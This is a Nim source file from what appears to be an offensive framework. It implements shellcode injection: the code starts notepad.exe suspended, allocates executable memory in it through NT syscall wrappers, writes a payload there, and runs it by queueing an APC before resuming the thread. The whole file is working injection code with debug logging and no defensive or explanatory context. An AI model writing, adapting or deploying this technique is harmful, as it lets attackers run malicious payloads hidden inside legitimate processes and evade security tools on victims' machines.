import winim
import strformat
import ../rth
import ../utils/utils
import ../utils/winapi_wrapper




proc execute*(payload: var Payload, pipeRead: HANDLE, pipeWrite: HANDLE): bool =

  var si: STARTUPINFOEX
  var pi: PROCESS_INFORMATION
  var res: WINBOOL

  si.StartupInfo.cb = sizeof(si).cint
  si.StartupInfo.hStdError = pipeWrite
  si.StartupInfo.hStdOutput = pipeWrite
  si.StartupInfo.dwFlags = si.StartupInfo.dwFlags or STARTF_USESTDHANDLES

  res = CreateProcess(
      newWideCString(r"C:\Windows\notepad.exe"),
      NULL,
      NULL,
      NULL,
      TRUE,
      CREATE_SUSPENDED,
      NULL,
      NULL,
      addr si.StartupInfo,
      addr pi
  )

  if res == FALSE:
    DBG("[-] Failed to create suspended process")
    return false

  DBG(fmt"[+] Started process with PID: {pi.dwProcessId}")


  # get the two handles for the new process/thread
  var
    hProc = pi.hProcess
    hThread = pi.hThread
    zeroBits: ULONG_PTR
    shellcodeSize = cast[SIZE_T](len(payload.bytes))
    shellcodeBuffer: PVOID
    status: NTSTATUS

  # Allocate the memory for the shellcode
  status = wNtAllocateVirtualMemory(
    hProc,
    addr shellcodeBuffer,
    zeroBits,
    addr shellcodeSize,
    MEM_COMMIT.or(MEM_RESERVE),
    PAGE_EXECUTE_READWRITE
  )

  if status != 0:
    DBG("[-] wNtAllocateVirtualMemory() failed")
    return false


  DBG(fmt"[+] wNtAllocateVirtualMemory() succesfull -> Buffer @ {cast[uint](shellcodeBuffer):#X}")

  var apcRoutine: PTHREAD_START_ROUTINE = cast[PTHREAD_START_ROUTINE](shellcodeBuffer)


  var bytes_written: ULONG

  status = wNtWriteVirtualMemory(
    hProc,
    shellcodeBuffer,
    addr payload.bytes[0],
    cast[ULONG](shellcodeSize),
    addr bytesWritten)

  if status != 0:
    DBG("[-] wNtWriteVirtualmemory() failed")
    return false


  DBG(fmt"[+] wNtWriteVirtualmemory() succesfull")
  DBG("[*] Queueing APC routine")
  QueueUserAPC(cast[PAPCFUNC](apcRoutine), hThread, 0)

  ResumeThread(hThread)

